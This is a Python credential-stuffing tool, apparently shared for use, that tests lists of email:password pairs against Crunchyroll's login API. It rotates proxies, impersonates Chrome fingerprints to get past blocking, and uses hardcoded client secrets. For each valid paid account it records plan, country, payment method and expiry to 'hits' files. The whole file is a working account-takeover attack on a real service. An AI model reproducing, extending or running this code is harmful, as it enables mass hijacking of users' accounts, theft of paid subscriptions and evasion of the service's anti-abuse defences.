import concurrent.futures
import threading
import time
import uuid
import os
import re
import json
import hashlib
import base64
import configparser
import ctypes
import sys
from datetime import datetime, timezone
from itertools import cycle

if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass
if hasattr(sys.stderr, 'reconfigure'):
    try:
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

try:
    from curl_cffi import requests as cf_requests
    CFFI_AVAILABLE = True
except ImportError:
    import requests as cf_requests
    CFFI_AVAILABLE = False

GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
LAVENDER = "\033[38;2;230;190;255m"
RESET   = "\033[0m"

config = configparser.ConfigParser()
config.read('config.ini')

try:
    threads_str = config['Settings']['threads'].split('#')[0].strip()
    THREADS     = int(threads_str)
    PROXY_TYPE  = config['Settings'].get('proxy_type', 'http').split('#')[0].strip()
except (KeyError, ValueError):
    THREADS    = 5
    PROXY_TYPE = 'http'
    print(f"{YELLOW}[!] Could not read settings from config.ini. Using defaults.{RESET}")

PROXY_FILE     = 'proxy.txt'
ACCOUNTS_FILE  = 'accounts.txt'
OUTPUT_FILE    = 'capture.txt'

LOGO = fr"""{YELLOW}
   ___                  _                _ _    ___ _           _           
  / __|_ _ _  _ _ _  __| |_ _  _ _ _ ___| | |  / __| |_  ___ __| |_____ _ _ 
 | (__| '_| || | ' \/ _| ' \ || | '_/ _ \ | | | (__| ' \/ -_) _| / / -_) _|
  \___|_|  \_,_|_||_\__|_||_\_, |_| \___/_|_|  \___|_||_\___\__|_\_\___|_|  
                              |__/                                            
{RESET}"""


SSO_AUTHORIZE = "https://sso.crunchyroll.com/authorize"
SSO_LOGIN     = "https://sso.crunchyroll.com/api/login"
API_TOKEN     = "https://beta-api.crunchyroll.com/auth/v1/token"
ACCOUNT_URL   = "https://beta-api.crunchyroll.com/accounts/v1/me"
BENEFITS_URL  = "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{}/benefits"
SUBS_V4_URL   = "https://beta-api.crunchyroll.com/subs/v4/accounts/{}/subscriptions"

REDIRECT_URI = "https://www.crunchyroll.com/callback"
AUTH_UA      = "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0"

CLIENT_CREDS = [
    {
        "client_id": "nmhhg0l6xyxcfm6ht6hf",
        "client_secret": "J4zmMfv3d1QdXy8t96wScx7hRy3rPG-3",
        "device_type": "SamsungTV",
        "device_name": "Goku"
    },
    {
        "client_id": "ajcylfwdtjjtq7qpgks3",
        "client_secret": "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_",
        "device_type": "SamsungTV",
        "device_name": "SM-G998U"
    },
    {
        "client_id": "y2arvjb0h0rgvtizlovy",
        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
        "device_type": "Oppo",
        "device_name": "MeowMal"
    }
]


STREAM_PLAN_MAP = {
    "6": "Ultimate Fan Plan",
    "4": "Mega Fan Plan",
    "1": "Fan Plan",
}

MAX_RETRIES = 50

def log_debug(message):
    with lock:
        try:
            with open("debug.log", "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now().isoformat()}] {message}\n")
        except Exception:
            pass
TIMEOUT     = 4

proxies_list  = []
proxy_cycle   = None
dead_proxies  = set()   
hits         = 0
bads         = 0
free_accs    = 0
retries_cnt  = 0
errors_cnt   = 0
two_fa       = 0
checked      = 0
total_accounts = 0
start_time   = 0
UI_MODE      = "2"
lock         = threading.Lock()
proxy_lock   = threading.Lock()


def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        sys.stdout.write('\033[H\033[2J')
        sys.stdout.flush()


def display_cui():
    clear_screen()
    print(LOGO)
    print(f"{LAVENDER}Cui-\n")
    print(f"Total    - {checked}/{total_accounts}")
    print(f"Hits     - {hits}")
    print(f"2FA      - {two_fa}")
    print(f"Bads     - {bads}")
    print(f"Free     - {free_accs}")
    print(f"Retries  - {retries_cnt}")
    print(f"Errors   - {errors_cnt}{RESET}\n")


def load_proxies():
    global proxies_list, proxy_cycle
    try:
        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
            proxies_list = [line.strip() for line in f if line.strip()]
        proxy_cycle = cycle(proxies_list)
        print(f"Loaded {len(proxies_list)} proxies.")
    except FileNotFoundError:
        print(f"{PROXY_FILE} not found. Running without proxies.")
        proxies_list = []


def get_proxy():
    if not proxies_list:
        return None, None
    with proxy_lock:
        if len(dead_proxies) >= len(proxies_list) * 0.85:
            dead_proxies.clear()
        for _ in range(len(proxies_list)):
            proxy_str = next(proxy_cycle)
            if proxy_str not in dead_proxies:
                break
        else:
            dead_proxies.clear()
            proxy_str = next(proxy_cycle)

    if "://" in proxy_str:
        return {"http": proxy_str, "https": proxy_str}, proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, pw = parts
        url = f"{PROXY_TYPE}://{user}:{pw}@{host}:{port}"
        return {"http": url, "https": url}, proxy_str
    elif len(parts) == 2:
        url = f"{PROXY_TYPE}://{proxy_str}"
        return {"http": url, "https": url}, proxy_str
    return None, proxy_str


def mark_dead(proxy_raw):
    """Mark a proxy as dead (timeout) so it gets skipped."""
    if proxy_raw:
        with proxy_lock:
            dead_proxies.add(proxy_raw)


def update_title():
    while checked < total_accounts:
        elapsed = time.time() - start_time
        cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
        title = f"Crunchyroll Checker | CPM: {cpm} | Hits: {hits} | Checked: {checked}/{total_accounts}"
        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        if UI_MODE == "1":
            display_cui()
        time.sleep(1)


def generate_pkce():
    verifier  = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
    challenge = base64.urlsafe_b64encode(
        hashlib.sha256(verifier.encode()).digest()
    ).rstrip(b"=").decode()
    return verifier, challenge


def safe_json(r):
    """Return parsed JSON or None if body is empty/HTML."""
    try:
        ct = r.headers.get("Content-Type", "")
        if "text/html" in ct:
            return None
        return r.json()
    except Exception:
        return None


def decode_jwt_payload(token):
    """Decode JWT payload to extract account_id if not in response."""
    try:
        parts = token.split('.')
        if len(parts) < 2:
            return {}
        payload = parts[1]

        payload += '=' * (4 - len(payload) % 4)
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception:
        return {}


def make_session(proxy=None):
    """Create a curl_cffi session with Chrome impersonation."""
    if CFFI_AVAILABLE:
        try:
            from curl_cffi.requests import CurlHttpVersion
            s = cf_requests.Session(impersonate="chrome120", http_version=CurlHttpVersion.V1_1)  # type: ignore
        except Exception:
            try:
                s = cf_requests.Session(impersonate="chrome120")  # type: ignore
            except Exception:
                import requests as req
                s = req.Session()
    else:
        import requests as req
        s = req.Session()
    if proxy:
        s.proxies = proxy
    return s


class RetryException(Exception):
    pass


def check_account(email, password):
    global checked, hits, bads, free_accs, retries_cnt, errors_cnt, two_fa

    attempt = 0
    while attempt < MAX_RETRIES:
        attempt += 1

        proxy, proxy_raw = get_proxy()
        session = make_session(proxy=proxy)

        try:
            device_id = str(uuid.uuid4())
            
            headers = {
                "Host": "beta-api.crunchyroll.com",
                "Accept": "application/json",
                "Accept-Charset": "UTF-8",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": AUTH_UA,
                "etp-anonymous-id": str(uuid.uuid4()),
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            access_token = None
            account_id = None
            login_success = False
            
            for cred in CLIENT_CREDS:
                try:
                    data = {
                        "grant_type": "password",
                        "username": email,
                        "password": password,
                        "scope": "offline_access",
                        "client_id": cred["client_id"],
                        "client_secret": cred["client_secret"],
                        "device_type": cred["device_type"],
                        "device_id": device_id,
                        "device_name": cred["device_name"]
                    }
                    r_token = session.post(API_TOKEN, headers=headers, data=data, timeout=TIMEOUT)
                except Exception as e:
                    log_debug(f"Direct Login Exception using {cred['client_id']} and {proxy_raw}: {e}")
                    mark_dead(proxy_raw)
                    with lock:
                        retries_cnt += 1
                    raise RetryException()

                status_code = r_token.status_code
                if status_code == 200:
                    token_body = safe_json(r_token)
                    if token_body:
                        access_token = token_body.get("access_token")
                        account_id = token_body.get("account_id")
                        if access_token:
                            login_success = True
                            break
                elif status_code == 401:
                    token_body = safe_json(r_token) or {}
                    body_str = json.dumps(token_body).lower()
                    
                    if "multi_factor_required" in body_str or "mfa" in body_str:
                        with lock:
                            two_fa += 1
                            checked += 1
                            if UI_MODE == "2":
                                print(f"{YELLOW}[!] 2FA: {email}{RESET}")
                        return
                    
                    if "force_password_reset" in body_str:
                        with lock:
                            bads += 1
                            checked += 1
                            if UI_MODE == "2":
                                print(f"{RED}[-] Invalid(Reset): {email}{RESET}")
                        return
                        
                    if any(x in body_str for x in ["invalid_credentials", "invalid_password", "invalid_grant", "incorrect_password"]):
                        with lock:
                            bads += 1
                            checked += 1
                            if UI_MODE == "2":
                                print(f"{RED}[-] Invalid: {email}{RESET}")
                        return
                elif status_code in [403, 429, 502, 503, 504]:
                    log_debug(f"Direct Login Blocked/Error (Status {status_code}) using {cred['client_id']} and {proxy_raw}")
                    mark_dead(proxy_raw)
                    with lock:
                        retries_cnt += 1
                    raise RetryException()

            if not login_success:
                with lock:
                    bads += 1
                    checked += 1
                    if UI_MODE == "2":
                        print(f"{RED}[-] Invalid: {email}{RESET}")
                return


            if not account_id and access_token:
                jwt_claims = decode_jwt_payload(access_token)
                account_id = jwt_claims.get("account_id") or jwt_claims.get("sub") or jwt_claims.get("aud")
                if isinstance(account_id, list):
                    account_id = account_id[0] if account_id else None


            etp_id = str(uuid.uuid4())
            bearer_headers = {
                "Host":             "beta-api.crunchyroll.com",
                "User-Agent":       AUTH_UA,
                "Pragma":           "no-cache",
                "Accept":           "*/*",
                "authorization":    f"Bearer {access_token}",
                "x-datadog-sampling-priority": "0",
                "etp-anonymous-id": etp_id,
                "Accept-Encoding":  "gzip, deflate",
            }

            external_id    = None
            email_verified = "N/A"

            try:
                r_me = session.get(ACCOUNT_URL, headers=bearer_headers, timeout=TIMEOUT)
            except Exception as e:
                log_debug(f"Step 4 Exception (Connection) for {email} using {proxy_raw}: {e}")
                mark_dead(proxy_raw)
                with lock:
                    retries_cnt += 1
                raise RetryException()

            if r_me.status_code == 403:
                me_data = safe_json(r_me) or {}
                if me_data.get("code") == "accounts.get_account_info.forbidden" or "accounts.get_account_info.forbidden" in r_me.text:
                    with lock:
                        free_accs += 1
                        checked   += 1
                        if UI_MODE == "2":
                            print(f"{YELLOW}[-] FREE: {email}{RESET}")
                    return
                else:
                    log_debug(f"Step 4 403 block for {email} using {proxy_raw}")
                    mark_dead(proxy_raw)
                    with lock:
                        retries_cnt += 1
                    raise RetryException()

            if r_me.status_code in [429, 502, 503, 504]:
                log_debug(f"Step 4 Proxy Block/Rate Limit (Status {r_me.status_code}) for {email} using {proxy_raw}")
                mark_dead(proxy_raw)
                with lock:
                    retries_cnt += 1
                raise RetryException()

            if r_me.status_code != 200:
                log_debug(f"Step 4 Bad Status (Status {r_me.status_code}) for {email} using {proxy_raw}")
                with lock:
                    retries_cnt += 1
                raise RetryException()

            me_data = safe_json(r_me) or {}
            external_id = me_data.get("external_id")
            ev_val      = me_data.get("email_verified")
            email_verified = "Yes ✔" if ev_val else "No ❌"

            if not account_id:
                account_id = me_data.get("account_id") or me_data.get("external_id")


            country   = "N/A"
            plan_name = None

            if external_id:
                try:
                    r_ben = session.get(
                        BENEFITS_URL.format(external_id),
                        headers=bearer_headers,
                        timeout=TIMEOUT,
                    )
                except Exception as e:
                    log_debug(f"Step 5 Exception (Connection) for {email} using {proxy_raw}: {e}")
                    mark_dead(proxy_raw)
                    with lock:
                        retries_cnt += 1
                    raise RetryException()

                ben_text = r_ben.text
                if r_ben.status_code in [403, 429, 502, 503, 504] and "subscription.not_found" not in ben_text and "Subscription Not Found" not in ben_text:
                    log_debug(f"Step 5 Proxy Block/Rate Limit (Status {r_ben.status_code}) for {email} using {proxy_raw}")
                    mark_dead(proxy_raw)
                    with lock:
                        retries_cnt += 1
                    raise RetryException()

                if r_ben.status_code != 200 and r_ben.status_code != 404:
                    log_debug(f"Step 5 Bad Status (Status {r_ben.status_code}) for {email} using {proxy_raw}")
                    with lock:
                        retries_cnt += 1
                    raise RetryException()

                if any(x in ben_text for x in [
                    '"total":0', "subscription.not_found",
                    "Subscription Not Found", '"items":[]'
                ]) or r_ben.status_code == 404:
                    with lock:
                        free_accs += 1
                        checked   += 1
                        if UI_MODE == "2":
                            print(f"{YELLOW}[-] FREE: {email}{RESET}")
                    return

                ben_data = safe_json(r_ben) or {}
                country = ben_data.get("subscription_country", "N/A") or "N/A"

                if "concurrent_streams.6" in ben_text:
                    plan_name = STREAM_PLAN_MAP["6"]
                elif "concurrent_streams.4" in ben_text:
                    plan_name = STREAM_PLAN_MAP["4"]
                elif "concurrent_streams.1" in ben_text:
                    plan_name = STREAM_PLAN_MAP["1"]


            renew_at       = "N/A"
            expires_at     = "N/A"
            remaining_days = None
            payment_method = "N/A"
            plan_price     = "N/A"
            plan_type_cap  = "N/A"
            cycle_cap      = "N/A"
            auto_renew_str = "N/A"
            free_trial_str = "N/A"

            if account_id:
                v4_items = []
                try:
                    v4_headers = {
                        "Host":             "beta-api.crunchyroll.com",
                        "authorization":    f"Bearer {access_token}",
                        "etp-anonymous-id": etp_id,
                        "Accept-Encoding":  "gzip, deflate",
                        "User-Agent":       AUTH_UA,
                    }
                    r_v4 = session.get(
                        SUBS_V4_URL.format(account_id),
                        headers=v4_headers,
                        timeout=TIMEOUT,
                    )
                    
                    if r_v4.status_code in [403, 429, 502, 503, 504]:
                        log_debug(f"Step 6 v4 Proxy Block/Rate Limit (Status {r_v4.status_code}) for {email} using {proxy_raw}")
                        mark_dead(proxy_raw)
                        with lock:
                            retries_cnt += 1
                        raise RetryException()
                        
                    if r_v4.status_code == 200:
                        v4_data = safe_json(r_v4) or {}
                        v4_items = v4_data.get("items", [])
                except RetryException:
                    raise
                except Exception as e:
                    log_debug(f"Step 6 v4 Exception for {email} using {proxy_raw}: {e}")
                    mark_dead(proxy_raw)
                    with lock:
                        retries_cnt += 1
                    raise RetryException()


                if not v4_items:
                    try:
                        r_v3 = session.get(
                            "https://beta-api.crunchyroll.com/subs/v3/subscriptions/{}".format(account_id),
                            headers=v4_headers,
                            timeout=TIMEOUT,
                        )
                        if r_v3.status_code in [403, 429, 502, 503, 504]:
                            log_debug(f"Step 6 v3 Proxy Block/Rate Limit (Status {r_v3.status_code}) for {email} using {proxy_raw}")
                            mark_dead(proxy_raw)
                            with lock:
                                retries_cnt += 1
                            raise RetryException()
                            
                        if r_v3.status_code == 200:
                            v3_data = safe_json(r_v3) or {}
                            all_products = []
                            if v3_data.get("subscription_products"):
                                all_products.extend(v3_data["subscription_products"])
                            if v3_data.get("third_party_subscription_products"):
                                all_products.extend(v3_data["third_party_subscription_products"])
                            if v3_data.get("nonrecurring_subscription_products"):
                                all_products.extend(v3_data["nonrecurring_subscription_products"])
                            
                            if all_products:
                                item = all_products[0]
                                tier = item.get("tier", "").lower()
                                product_obj = item.get("product") or {}
                                product_name = product_obj.get("name", "") if isinstance(product_obj, dict) else ""
                                if not product_name:
                                    product_name = item.get("sku", "").lower()
                                
                                if "super_fan" in tier or "ultimate" in product_name or "super_fan" in product_name:
                                    plan_name = "Ultimate Fan Plan"
                                elif "fan_pack" in tier or "mega" in product_name or "fan_pack" in product_name:
                                    plan_name = "Mega Fan Plan"
                                elif "premium" in tier or "fan" in product_name or "premium" in product_name:
                                    plan_name = "Fan Plan"
                                else:
                                    plan_name = tier.title() if tier else (product_name.title() if product_name else "Premium Member")
                                
                                auto_renew_val = None
                                for k in ["auto_renew", "autoRenew", "is_renewing", "isRenewing"]:
                                    if k in item:
                                        auto_renew_val = item[k]
                                        break
                                if auto_renew_val is not None:
                                    auto_renew_str = "true" if auto_renew_val else "false"
                                    
                                free_trial_val = None
                                for k in ["active_free_trial", "in_trial", "free_trial", "isFreeTrial"]:
                                    if k in item:
                                        free_trial_val = item[k]
                                        break
                                if free_trial_val is not None:
                                    free_trial_str = "true" if free_trial_val else "false"
                                    
                                payment_method = item.get("source") or item.get("paymentMethodType") or "N/A"
                                
                                expires_raw = item.get("expiration_date") or item.get("next_renewal_date") or item.get("end_date") or ""
                                if expires_raw:
                                    if "T" in str(expires_raw):
                                        expires_at = str(expires_raw).split("T")[0]
                                    else:
                                        expires_at = str(expires_raw)
                                    expiry_date = expires_at
                                    if expiry_date != "N/A":
                                        try:
                                            rd = datetime.strptime(expiry_date, "%Y-%m-%d")
                                            today = datetime.now(timezone.utc).replace(tzinfo=None).replace(hour=0, minute=0, second=0, microsecond=0)
                                            remaining_days = (rd - today).days
                                        except Exception:
                                            pass
                    except RetryException:
                        raise
                    except Exception as e:
                        log_debug(f"Step 6 v3 Exception for {email} using {proxy_raw}: {e}")
                        mark_dead(proxy_raw)
                        with lock:
                            retries_cnt += 1
                        raise RetryException()

                if v4_items:
                    item = v4_items[0]
                    plan_obj = item.get("plan") or {}

                    payment_method = item.get("paymentMethodType") or item.get("source") or plan_obj.get("source") or "N/A"

                    plan_type_raw = item.get("planType", "") or ""
                    if plan_type_raw:
                        plan_type_cap = plan_type_raw

                    if not plan_name and plan_type_raw:
                        pt = plan_type_raw.lower()
                        if "ultimate" in pt or "super_fan" in pt:
                            plan_name = STREAM_PLAN_MAP["6"]
                        elif "mega" in pt or "fan_pack" in pt:
                            plan_name = STREAM_PLAN_MAP["4"]
                        elif "fan" in pt or "premium" in pt:
                            plan_name = STREAM_PLAN_MAP["1"]
                        else:
                            plan_name = plan_type_cap if plan_type_cap != "N/A" else "Premium Member"

                    cycle_cap = item.get("cycleDuration", "N/A") or "N/A"

                    currency = item.get("currencyCode") or plan_obj.get("currencyCode") or ""
                    amt = item.get("amount") or plan_obj.get("amount") or ""
                    if currency or amt:
                        plan_price = f"{amt} {currency}".strip()

                    auto_renew_val = None
                    for key in ["autoRenew", "auto_renew", "isRenewing", "is_renewing"]:
                        if key in item:
                            auto_renew_val = item[key]
                            break
                    if auto_renew_val is not None:
                        auto_renew_str = "true" if auto_renew_val else "false"

                    free_trial_val = None
                    for key in ["isFreeTrial", "inFreeTrial", "freeTrial", "activeFreeTrial", "active_free_trial", "in_trial", "free_trial"]:
                        if key in item:
                            free_trial_val = item[key]
                            break
                    if free_trial_val is not None:
                        free_trial_str = "true" if free_trial_val else "false"

                    next_renewal = item.get("nextRenewalDate") or item.get("next_renewal_date") or ""
                    if next_renewal:
                        if "T" in str(next_renewal):
                            renew_at = str(next_renewal).split("T")[0]
                        else:
                            renew_at = str(next_renewal)

                    expires_raw = item.get("expiresAt") or item.get("expires_at") or item.get("expirationDate") or item.get("expiration_date") or item.get("endDate") or item.get("end_date") or ""
                    if expires_raw:
                        if "T" in str(expires_raw):
                            expires_at = str(expires_raw).split("T")[0]
                        else:
                            expires_at = str(expires_raw)

                    expiry_date = renew_at if renew_at != "N/A" else expires_at
                    if expiry_date != "N/A":
                        try:
                            rd = datetime.strptime(expiry_date, "%Y-%m-%d")
                            today = datetime.now(timezone.utc).replace(tzinfo=None).replace(hour=0, minute=0, second=0, microsecond=0)
                            remaining_days = (rd - today).days
                        except Exception:
                            pass


            if not plan_name and (payment_method != "N/A" or plan_price != "N/A"):
                plan_name = "Premium Member"

            is_expired = remaining_days is not None and remaining_days <= 0
            expiry_date = renew_at if renew_at != "N/A" else expires_at


            if plan_name:
                if auto_renew_str == "N/A":
                    auto_renew_str = "false"
                if free_trial_str == "N/A":
                    free_trial_str = "false"
                if payment_method == "N/A":
                    payment_method = "Gift / Third Party"
                if expiry_date == "N/A":
                    expiry_date = "Lifetime / Unknown"

            if plan_name and not is_expired:
                capture_line = (
                    f"{email}:{password} | "
                    f"Country = {country} | "
                    f"Plan = {plan_name} | "
                    f"Auto-Renew = {auto_renew_str} | "
                    f"Free Trial = {free_trial_str} | "
                    f"Payment Method = {payment_method} | "
                    f"Expiry Date = {expiry_date}\n"
                )
                with lock:
                    hits    += 1
                    checked += 1
                    if UI_MODE == "2":
                        print(f"{GREEN}[+] HIT: {email} | Country = {country} | Plan = {plan_name} | Auto-Renew = {auto_renew_str} | Payment Method = {payment_method} | Expiry = {expiry_date}{RESET}")
                    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
                        f.write(capture_line)
                    with open('hits.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}\n")
            elif is_expired:
                with lock:
                    bads    += 1
                    checked += 1
                    if UI_MODE == "2":
                        print(f"{RED}[-] EXPIRED: {email}{RESET}")
            else:
                with lock:
                    free_accs += 1
                    checked   += 1
                    if UI_MODE == "2":
                        print(f"{YELLOW}[-] FREE: {email}{RESET}")
            return
        except RetryException:
            continue
        finally:
            try:
                session.close()
            except Exception:
                pass


    with lock:
        errors_cnt += 1
        checked    += 1
        if UI_MODE == "2":
            print(f"{YELLOW}[?] ERROR (proxy/CF): {email}{RESET}")


def main():
    clear_screen()
    print(LOGO)
    print(f"{RED}By MeowMal Dev's{RESET}")

    if not CFFI_AVAILABLE:
        print(f"{YELLOW}[!] curl_cffi not installed — run: pip install curl_cffi{RESET}")

    global UI_MODE

    env_ui_mode = os.environ.get("UI_MODE")
    if env_ui_mode in ["1", "2"]:
        UI_MODE = env_ui_mode
    elif len(sys.argv) > 1 and sys.argv[1] in ["1", "2"]:
        UI_MODE = sys.argv[1]
    elif not sys.stdin.isatty():

        UI_MODE = "2"
    else:
        prompt = f"\n[{YELLOW}1{RESET}] CUI            [{YELLOW}2{RESET}] Live Logs\n\n[{YELLOW}>{RESET}] Choice: "
        sys.stdout.write(prompt)
        sys.stdout.flush()
        UI_MODE = input().strip()
        if UI_MODE not in ["1", "2"]:
            UI_MODE = "2"

    load_proxies()

    accounts = []
    try:
        with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    email, password = line.split(':', 1)
                    accounts.append((email, password))
    except FileNotFoundError:
        print(f"{ACCOUNTS_FILE} not found!")
        return

    global total_accounts, start_time
    total_accounts = len(accounts)

    print(f"Starting check on {len(accounts)} accounts with {THREADS} threads...")

    start_time = time.time()
    threading.Thread(target=update_title, daemon=True).start()

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(check_account, acc[0], acc[1]) for acc in accounts]
        concurrent.futures.wait(futures)

    print("Checking complete.")
    print(f"Hits: {hits} / {len(accounts)}")

    elapsed = time.time() - start_time
    formatted_time = time.strftime("[%H:%M:%S]", time.gmtime(elapsed))
    print(formatted_time)
    if sys.stdin.isatty() and not os.environ.get("UI_MODE") and not (len(sys.argv) > 1 and sys.argv[1] in ["1", "2"]):
        try:
            input("\nPress Enter to exit...")
        except Exception:
            pass


if __name__ == "__main__":
    main()
